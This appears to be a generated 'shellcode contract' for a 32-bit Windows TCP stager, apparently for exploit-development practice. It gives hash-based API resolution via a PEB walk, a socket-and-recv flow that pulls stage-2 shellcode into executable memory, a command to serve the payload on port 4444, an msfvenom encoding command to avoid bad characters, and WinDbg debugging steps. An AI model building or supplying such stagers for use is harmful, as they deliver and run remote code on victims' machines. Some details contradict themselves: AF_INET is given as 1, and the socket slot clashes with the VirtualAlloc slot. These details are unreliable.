# Shellcode Contract

Generated from manifest.

---

# Stack Layout

Frame: `mov ebp, esp` / `sub esp, 0x300` (0x300 bytes reserved)

## Export Context (reserved - do not allocate)

| Offset | Description |
|--------|-------------|
| `[ebp-0x04]` | Module base (transient) |
| `[ebp-0x08]` | AddressOfNames VA |
| `[ebp-0x0c]` | AddressOfNameOrdinals VA |
| `[ebp-0x10]` | AddressOfFunctions VA |
| `[ebp-0x14]` | NumberOfNames |
| `[ebp-0x18]` | Target hash (transient) |

## Module Bases

| Offset | Module |
|--------|--------|
| `[ebp-0x20]` | kernel32.dll |
| `[ebp-0x24]` | ws2_32.dll |

## API Table

| Offset | API | Module |
|--------|-----|--------|
| `[ebp-0x28]` | LoadLibraryA | kernel32.dll |
| `[ebp-0x2c]` | WSAStartup | ws2_32.dll |
| `[ebp-0x30]` | WSASocketA | ws2_32.dll |
| `[ebp-0x34]` | connect | ws2_32.dll |
| `[ebp-0x38]` | recv | ws2_32.dll |
| `[ebp-0x3c]` | closesocket | ws2_32.dll |
| `[ebp-0x40]` | VirtualAlloc | kernel32.dll |

## Variables

| Offset | Variable | Size |
|--------|----------|------|
| `[ebp-0x44]` | bytes_total | 4 |
| `[ebp-0x48]` | bytes_recvd | 4 |
| `[ebp-0x4c]` | remaining | 4 |
| `[ebp-0x50]` | recv_buf_ptr | 4 |
| `[ebp-0x54]` | wsa_ret | 4 |
| `[ebp-0x58]` | socket_handle | 4 |
| `[ebp-0x5c]` | conn_ret | 4 |
| `[ebp-0x60]` | recv_size_ret | 4 |
| `[ebp-0x64]` | virt_buf | 4 |
| `[ebp-0x68]` | recv_ret | 4 |

## Structures

| Offset | Structure | Size |
|--------|-----------|------|
| `[ebp-0x290]` | WSADATA | 0x190 |
| `[ebp-0x2a0]` | sockaddr_in | 0x10 |

## Strings

_No strings._

---

# API Contracts

## kernel32.dll

Resolution: PEB walk

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| LoadLibraryA | `0xec0e4e8e` | `[ebp-0x28]` | library |
| VirtualAlloc | `0x91afca54` | `[ebp-0x40]` | memory |

### API Details

#### LoadLibraryA

**Slot:** `[ebp-0x28]`
**Hash:** `0xec0e4e8e`
**Module:** kernel32.dll
**Category:** library

```c
HMODULE LoadLibraryA(LPCSTR lpLibFileName)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpLibFileName | LPCSTR | e.g. ws2_32.dll |

---

#### VirtualAlloc

**Slot:** `[ebp-0x40]`
**Hash:** `0x91afca54`
**Module:** kernel32.dll
**Category:** memory

```c
LPVOID VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpAddress | LPVOID | NULL to let OS choose; or preferred address |
| 2 | dwSize | SIZE_T | size of region in bytes |
| 3 | flAllocationType | DWORD | MEM_COMMIT|MEM_RESERVE = 0x3000 |
| 4 | flProtect | DWORD | PAGE_EXECUTE_READWRITE = 0x40 |

---

## ws2_32.dll

Resolution: `LoadLibraryA("ws2_32.dll")` -> base stored at `[ebp-0x24]`

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| WSAStartup | `0x3bfcedcb` | `[ebp-0x2c]` | network |
| WSASocketA | `0xadf509d9` | `[ebp-0x30]` | network |
| connect | `0x60aaf9ec` | `[ebp-0x34]` | network |
| recv | `0xe71819b6` | `[ebp-0x38]` | network |
| closesocket | `0x79c679e7` | `[ebp-0x3c]` | network |

### API Details

#### WSAStartup

**Slot:** `[ebp-0x2c]`
**Hash:** `0x3bfcedcb`
**Module:** ws2_32.dll
**Category:** network

```c
int WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | wVersionRequested | WORD | MAKEWORD(2,2) = 0x0202 |
| 2 | lpWSAData | LPWSADATA | output buffer, allocate 0x190 bytes on stack |

---

#### WSASocketA

**Slot:** `[ebp-0x30]`
**Hash:** `0xadf509d9`
**Module:** ws2_32.dll
**Category:** network

```c
SOCKET WSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | af | int | AF_INET = 1 |
| 2 | type | int | SOCK_STREAM = 1 |
| 3 | protocol | int | IPPROTO_TCP = 6 |
| 4 | lpProtocolInfo | LPWSAPROTOCOL_INFOA | NULL |
| 5 | g | GROUP | NULL |
| 6 | dwFlags | DWORD | NULL |

---

#### connect

**Slot:** `[ebp-0x34]`
**Hash:** `0x60aaf9ec`
**Module:** ws2_32.dll
**Category:** network

```c
int connect(SOCKET s, const struct sockaddr *name, int namelen)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | s | SOCKET | socket handle from WSASocketA; stored at [ebp-0x40] |
| 2 | name | const struct sockaddr * | pointer to sockaddr_in on stack |
| 3 | namelen | int | 0x10 |

---

#### recv

**Slot:** `[ebp-0x38]`
**Hash:** `0xe71819b6`
**Module:** ws2_32.dll
**Category:** network

```c
int recv(SOCKET s, char *buf, int len, int flags)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | s | SOCKET | connected socket handle |
| 2 | buf | char * | pointer to receive buffer |
| 3 | len | int | size of buffer in bytes |
| 4 | flags | int | 0 for default behaviour |

---

#### closesocket

**Slot:** `[ebp-0x3c]`
**Hash:** `0x79c679e7`
**Module:** ws2_32.dll
**Category:** network

```c
int closesocket(SOCKET s)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | s | SOCKET | socket handle to close |

---

---

# Structure Layouts

## WSADATA

**Size:** `0x190`
**Required by:** WSAStartup

_No field documentation (opaque output buffer)._

---

## sockaddr_in

**Size:** `0x10`
**Required by:** connect

| Offset | Field | Size | Notes |
|--------|-------|------|-------|
| `+0x00` | sin_family | 2 | AF_INET = 0x0002 |
| `+0x02` | sin_port | 2 | network byte order, e.g. 0x2329 = port 9001 |
| `+0x04` | sin_addr | 4 | network byte order IPv4 address |
| `+0x08` | sin_zero | 8 | zeroed padding |

---

---

# Operational Cheatsheet

**Template:** IRTcpStagerTemplate
**Target:** `127.0.0.1:4444`
**Bad characters:** `0x00` `0x0a` `0x0d`

## Setup Commands

**Serve stage-2 shellcode:**
```
python3 Tools/tcp_stage_server.py --port 4444 --file emitter_out/bin/shellcode.bin
```

**Protocol:**
```
[4 bytes LE size][raw stage-2 shellcode bytes]
```

## Encoding (if needed)

Remove bad chars with msfvenom (requires `shellcode.bin`):
```
cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python -v shellcode
```

---

# WinDbg Cheatsheet

Run `debug_runner.py` under 32-bit Python. Attach WinDbg to the
python.exe process. Set `bp <address>` using the printed shellcode
address, then press Enter in the script to start execution.

## Quick Reference

| Command | Description |
|---------|-------------|
| `bp <addr>` | Set breakpoint |
| `bl` | List breakpoints |
| `g` | Go (continue) |
| `t` | Step into |
| `p` | Step over |
| `pt` | Step to next return |
| `r` | Show all registers |
| `r eax` | Show one register |
| `u eip L10` | Disassemble next 16 instructions |
| `db <addr> L<n>` | Dump bytes |
| `dd <addr> L<n>` | Dump dwords |
| `da <addr>` | Dump ASCII string |
| `!address <addr>` | Show memory region info |

## Inspect API Pointers After Resolution

After the PEB walk and hash resolution, each resolved function
pointer is stored at its stack slot. Verify with:

```
dd ebp-0x28 L1    ; LoadLibraryA
dd ebp-0x2c L1    ; WSAStartup
dd ebp-0x30 L1    ; WSASocketA
dd ebp-0x34 L1    ; connect
dd ebp-0x38 L1    ; recv
dd ebp-0x3c L1    ; closesocket
dd ebp-0x40 L1    ; VirtualAlloc
```

## Inspect Structures Before API Calls

### WSADATA (0x190 bytes)

Base address: `ebp-0x290`

```
dd ebp-0x290 L8    ; first 8 dwords
db ebp-0x290 L20    ; raw bytes
```

### sockaddr_in (0x10 bytes)

Base address: `ebp-0x2a0`

```
dd ebp-0x2a0 L4    ; first 4 dwords
db ebp-0x2a0 L10    ; raw bytes
```

Key fields:

- `db ebp-0x2a0 L2`  sin_family (+0x00)
- `db ebp-0x29e L2`  sin_port (+0x02)
- `dd ebp-0x29c L1`  sin_addr (+0x04)
- `dd ebp-0x298 L1`  sin_zero (+0x08)

## Breakpoint Strategy

Set breakpoints at each `call [ebp-0xNN]` in the generated
assembly to pause before each API call. After each call, check
`eax` for the return value:

```
bp <sc_base>+<offset_of_call_LoadLibraryA>
bp <sc_base>+<offset_of_call_WSAStartup>  ; eax=0 on success
bp <sc_base>+<offset_of_call_WSASocketA>  ; eax=socket handle (not INVALID_SOCKET)
bp <sc_base>+<offset_of_call_connect>  ; eax=0 on success
bp <sc_base>+<offset_of_call_recv>
bp <sc_base>+<offset_of_call_closesocket>
bp <sc_base>+<offset_of_call_VirtualAlloc>
```

Find the call offsets by searching `generated.asm` for
`call [ebp-` instructions. Add the instruction's line offset
from the start of the shellcode to the base address.